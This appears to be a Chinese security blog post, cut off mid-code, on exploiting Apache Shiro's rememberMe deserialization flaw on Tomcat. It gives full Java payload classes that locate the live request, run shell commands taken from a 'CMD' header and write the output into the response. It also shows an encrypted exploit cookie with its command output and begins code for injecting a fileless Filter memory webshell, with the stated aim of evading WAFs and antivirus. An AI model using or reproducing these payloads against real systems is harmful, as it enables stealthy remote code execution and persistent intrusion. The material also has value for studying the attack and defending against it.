---
created: 2024-09-30T02:58:00+00:00
categories:
  - 技术研究
tags:
  - RCE
updated: 2023-06-28T00:00:00+00:00
date: 2023-05-20T00:00:00+00:00
slug: attacking-shiro-with-tomcat-memshell
title: 利用Tomcat内存马攻击Shiro应用
cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/20afd286-40f2-4484-8f4e-bb086ab05975/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=b0c791a191cc55d5813bcc94a9022e1557c9ba318330de38e0bb30b959cbb4bb&X-Amz-SignedHeaders=host&x-id=GetObject
id: 111906e1-7468-803d-ad61-c0422e2c275a
---

## 背景

在前面 Shiro 利用的文章中，都是直接利用反序列化漏洞对 Shiro 应用进行攻击，使其弹出一个计算器，这当然只是在实验环境中，对漏洞成功利用的一个简单概念验证。在实战环境中，没法这么干，原因有二，一是我们很难得知被攻击机器是否成功执行了命令，特别是在目标机器不出网的环境下；基于一，我们可能会尝试上传 WebShell 文件，但这种方式尤其是在当下各类防御设备齐出马的形势下，极大可能会被杀软或 WAF 检测到，从而使得攻击被察觉，这就是原因二，落地 Webshell 文件容易被安全设备发现。

前文[《Tomcat Filter 型内存马》](https://0xf4n9x.github.io/tomcat-filter-memshell)中，是通过上传一个 JSP 的 Webshell 文件，访问并执行来达到内存马的注入，但这似乎也背离了内存马无文件落地的初衷。

由此，在这篇文章中将解决以上痛点，利用反序列化漏洞实现命令执行的回显输出，并结合内存马注入达到真正的无文件落地、内存马常驻以提升攻击的隐蔽性。

## 请求与响应

当客户端发送一个 HTTP 请求到 Tomcat 服务器时，Tomcat 会创建一个 Request 对象来封装请求信息，随后这个 Request 对象会被传递给相应的 Servlet 或 Filter 进行处理，处理完成后，最后会通过 Response 对象设置响应信息。

想要达到命令执行结果作为响应回显输出，就必然需要先控制 HTTP 请求与响应对象，在 Tomcat 中用于处理 HTTP 请求与响应的核心类是 org.apache.coyote.Request 和 org.apache.coyote.Response。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/ded61b21-aafa-4784-a7b9-342d0e2127ab/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=0cd09c971f13ab54fa18742b8643ceffbb5b844b0d6bd153d4606b79f5a72c48&X-Amz-SignedHeaders=host&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/dd597acd-6430-4204-be40-2cf9d911e082/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=24d15df1f73f5f04e8798e4d584db6278b5989416ad5f5beb4e752d7c9810ea5&X-Amz-SignedHeaders=host&x-id=GetObject)

Request 类封装了客户端发送到服务器的所有请求信息，包括请求行、头信息、参数和正文内容，而 Response 类封装了服务器发送给客户端的所有响应信息，包括状态码、头信息和正文内容。

受[《基于全局储存的新思路 | Tomcat 的一种通用回显方法研究》](https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A)一文得到的启发，我们通过遍历线程组来寻找 Request 和 Response 对象。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/c2c0e535-90cd-493a-a8a3-a92612616c79/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=31ebce41991d1bebfd32674dce4b4f73eaa6e937f95a034b63a58fa2e38ed489&X-Amz-SignedHeaders=host&x-id=GetObject)

构造如下核心代码用于获取 Request 对象，有了 Request，Response 便也能获取到。

```java
boolean flag = false;
Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

for (int i = 0; i < threads.length; ++i) {
    Thread thread = threads[i];
    if (thread != null) {
        String threadName = thread.getName();
        if (!threadName.contains("exec") && threadName.contains("http")) {
            Object obj = getFieldValue(thread, "target");
            if (obj instanceof Runnable) {
                try {
                    obj = getFieldValue(getFieldValue(getFieldValue(obj, "this$0"), "handler"), "global");
                } catch (Exception e) {
                    continue;
                }

                java.util.List processors = (java.util.List) getFieldValue(obj,"processors");

                for (int n = 0; n < processors.size(); ++n) {
                    Object processor = processors.get(n);
                    obj = getFieldValue(processor, "req");
                    Object resp = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
                    String host = (String) obj.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(obj, new Object[]{new String("Host")});
                    if (host != null && !host.isEmpty()) {
                        // ...
                        flag = true;
                    }

                    // ...

                    if (flag) {
                        break;
                    }
                }

                if (flag) {
                    break;
                }
            }
        }
    }
}
```

其中 getFieldValue 方法通过反射获取对象的私有字段或受保护字段的值。

```java
private static Object getFieldValue(Object obj, String field) throws Exception {
    java.lang.reflect.Field f = null;
  Class cls = obj.getClass();

    while (cls != Object.class) {
        try {
            f = cls.getDeclaredField(field);
            break;
        } catch (NoSuchFieldException e) {
            cls = cls.getSuperclass();
        }
    }

    if (f == null) {
        throw new NoSuchFieldException(field);
    } else {
        f.setAccessible(true);
        return f.get(obj);
    }
}
```

## 回显输出

既然成功获取到了 Request 和 Response，那便可以构造 Tomcat 回显的核心代码了。

```java
package org.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

public class TomcatEcho extends AbstractTranslet {

    private static void writeBody(Object obj, byte[] bytes) throws Exception {
        byte[] bs = (new java.lang.String(bytes)).getBytes();
        Object object;
        Class cls;
        try {
            cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            object = cls.newInstance();
            cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(object, new Object[]{bs, new Integer(0), new Integer(bs.length)});
            obj.getClass().getMethod("doWrite", new Class[]{cls}).invoke(obj, new Object[]{object});
        } catch (Exception e) {
            cls = Class.forName("java.nio.ByteBuffer");
            object = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{bs});
            obj.getClass().getMethod("doWrite", new Class[]{cls}).invoke(obj, new Object[]{object});
        }
    }

    private static Object getFieldValue(Object obj, String field) throws Exception {
        java.lang.reflect.Field f = null;
        Class cls = obj.getClass();

        while (cls != Object.class) {
            try {
                f = cls.getDeclaredField(field);
                break;
            } catch (NoSuchFieldException e) {
                cls = cls.getSuperclass();
            }
        }

        if (f == null) {
            throw new NoSuchFieldException(field);
        } else {
            f.setAccessible(true);
            return f.get(obj);
        }
    }

    public TomcatEcho() throws Exception {
        boolean flag = false;
        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

        for (int i = 0; i < threads.length; ++i) {
            Thread thread = threads[i];
            if (thread != null) {
                String threadName = thread.getName();
                if (!threadName.contains("exec") && threadName.contains("http")) {
                    Object obj = getFieldValue(thread, "target");
                    if (obj instanceof Runnable) {
                        try {
                            obj = getFieldValue(getFieldValue(getFieldValue(obj, "this$0"), "handler"), "global");
                        } catch (Exception e) {
                            continue;
                        }

                        java.util.List processors = (java.util.List) getFieldValue(obj,"processors");

                        for (int n = 0; n < processors.size(); ++n) {
                            Object processor = processors.get(n);
                            obj = getFieldValue(processor, "req");
                            Object resp = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
                            String host = (String) obj.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(obj, new Object[]{new String("Host")});
                            if (host != null && !host.isEmpty()) {
                                resp.getClass().getMethod("setStatus", new Class[]{Integer.TYPE}).invoke(resp, new Object[]{new Integer(200)});
                                flag = true;
                            }

                            String cmd = (String) obj.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(obj, new Object[]{new String("CMD")});
                            if (cmd != null && !cmd.isEmpty()) {
                                String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                                writeBody(resp, (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                                flag = true;
                            }

                            if (flag) {
                                break;
                            }
                        }

                        if (flag) {
                            break;
                        }
                    }
                }
            }
        }
    }
}
```

将如上类配合 CB1 链并进行 AES 加密，生成恶意的 Shiro rememberMe Cookie，然后发送 HTTP 请求，结果如下，成功执行 pwd 命令。

```text
GET /login.jsp HTTP/1.1
Host: 192.168.1.100:8089
CMD: pwd
Cookie: rememberMe=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
Connection: close

```

```text
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Date: Wed, 22 May 2023 11:17:49 GMT
Connection: close
Content-Length: 43

/opt/apache-tomcat/apache-tomcat-7.0.0/bin
```

## Filter 型内存马

以上实现的命令执行回显输出还只是开胃小菜，它每次执行命令都需要携带很长的一串 Payload。接下来进入正餐时刻，内存马，一次注入，随处使用。

在我的前一篇文章[《Tomcat Filter 型内存马》](https://0xf4n9x.github.io/tomcat-filter-memshell)中已经提到了关于 Filter 型内存马的基础知识，不过在那篇文章中，攻击的手法是通过上传一个 JSP Webshell 文件，访问执行才达到内存马的注入，在那种情况下，是无需关心 Request 对象的获取的。但这也背离了内存马无文件落地的初衷。

### StandardContext

在注入内存马前的一个关键就是获取 StandardContext 对象，StandardContext 是 org.apache.catalina.Context 接口的一个实现类，代表了一个具体的 Web 应用上下文，并管理着应用的配置、生命周期和组件（如 Servlet 和 Filter）。

在前文中获取 StandardContext 的方式如下，其中 ServletContext 是一个标准的 Servlet API 接口，提供了与 Web 应用交互的方法。ApplicationContext 则是 ServletContext 的一个实现类，可以直接从 ServletContext 中获取 context 字段，该字段指向了 ApplicationContext 对象，同时在 ApplicationContext 中也包含一个 context 字段指向 StandardContext。

```java
ServletContext servletContext = request.getSession().getServletContext();

Field contextField = servletContext.getClass().getDeclaredField("context");
contextField.setAccessible(true);

org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
contextField = applicationContext.getClass().getDeclaredField("context");
contextField.setAccessible(true);

org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
```

### Request 对象的转换

基于以上，我们也可以重复利用上面的代码。但不同地是，前文中的 request 是 javax.servlet.http.HttpServletRequest，而这里获取到的是 org.apache.coyote.Request，它们二者都是处理 HTTP 请求的关键类，但所处的层次有所不同。org.apache.coyote.Request 主要负责底层的 HTTP 请求解析和处理，javax.servlet.http.HttpServletRequest 则是面向开发者的更高层次的抽象，它能够方便 Web 应用处理 HTTP 请求。所以还需要将 org.apache.coyote.Request 做更高层次的转换，转换为 javax.servlet.http.HttpServletRequest。

javax.servlet.jsp.PageContext 提供了对 JSP 页面执行环境中各种信息的访问，包括请求对象、响应对象、会话对象、应用上下文等。所以，可直接利用该类中的 getRequest 与 getResponse 方法来获取 HttpServletRequest 与 HttpServletResponse 对象。

```java
public void getReqResp(Object obj) {
    if (obj.getClass().isArray()) {
        Object[] data = (Object[]) ((Object[])((Object[])obj));
        this.request = (HttpServletRequest) data[0];
        this.response = (HttpServletResponse) data[1];
    } else {
        try {
            Class pageContext = Class.forName("javax.servlet.jsp.PageContext");
            this.request = (HttpServletRequest) pageContext.getDeclaredMethod("getRequest").invoke(obj);
            this.response = (HttpServletResponse) pageContext.getDeclaredMethod("getResponse").invoke(obj);
        } catch (Exception e) {
            if (obj instanceof HttpServletRequest) {
                this.request = (HttpServletRequest) obj;

                try {
                    Field reqField = this.request.getClass().getDeclaredField("request");
                    reqField.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) reqField.get(this.request);
                    Field respField = request2.getClass().getDeclaredField("response");
                    respField.setAccessible(true);
                    this.response = (HttpServletResponse) respField.get(request2);
                } catch (Exception ex) {
                    try {
                        this.response = (HttpServletResponse) this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                    } catch (Exception exc) {
                    }
                }
            }
        }
    }
}
```

### defineClass

现在有了 Request 和 StandardContext，终于可以构造 Filter 内存马了，但会发现生成的 Payload 长度非常大，已经超过 Tomcat 默认 8K 的 maxHttpHeaderSize，超出这个大小后 Tomcat 便会返回 400 状态码。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/eef2980b-634c-4556-ad1a-22e7ed3d6d7d/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=9a4c1548353f2c52da85f3541d7f87bebb45596cb2b522a9a08696b4a686bca1&X-Amz-SignedHeaders=host&x-id=GetObject)

运用先前学到的 Java 类加载知识，将添加 Filter 的恶意类作为 POST 参数值进行传递。

```java
package org.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;
import sun.misc.BASE64Decoder;

public class DefineClass extends AbstractTranslet {
    private static Object getFieldValue(Object obj, String field) throws Exception {
        java.lang.reflect.Field f = null;
        Class cls = obj.getClass();

        while (cls != Object.class) {
            try {
                f = cls.getDeclaredField(field);
                break;
            } catch (NoSuchFieldException e) {
                cls = cls.getSuperclass();
            }
        }

        if (f == null) {
            throw new NoSuchFieldException(field);
        } else {
            f.setAccessible(true);
            return f.get(obj);
        }
    }

    public DefineClass() throws Exception {
        boolean flag = false;
        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

        for (int i = 0; i < threads.length; ++i) {
            Thread thread = threads[i];
            if (thread != null) {
                String threadName = thread.getName();
                if (!threadName.contains("exec") && threadName.contains("http")) {
                    Object obj = getFieldValue(thread, "target");
                    if (obj instanceof Runnable) {
                        try {
